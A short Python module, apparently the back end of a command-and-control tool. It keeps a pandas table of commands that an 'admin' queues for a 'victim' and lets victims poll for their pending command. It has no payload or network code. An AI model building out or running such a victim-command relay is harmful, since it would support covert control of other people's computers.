import pandas as pd
import time


time_ = time.time()
commands_df = pd.DataFrame(columns=[
    'id_admin', 'id_victim', 'commands'
])


async def async_create_command(id_admin: int, id_vicitm: int, commands: str):
    global commands_df
    commands_df.loc[len(commands_df.index)] = [id_admin, id_vicitm, commands]
    print(commands_df)
    return "ok"


async def async_check_availability_victim(id_vicitm: int):
    global commands_df
    df = commands_df.loc[commands_df["id_victim"] == id_vicitm]
    print("\n\n\n", df, "\n\n\n")
    if df.empty:
        return None
    print(df)
    print("\n\n\n", df.loc[0]["commands"])
    return df.loc[0]["commands"]


async def async_check_availability_admin(id_admin: int):
    global commands_df
    df = commands_df.loc[commands_df["id_admin"] == id_admin]
    if df.empty:
        return None
    return df
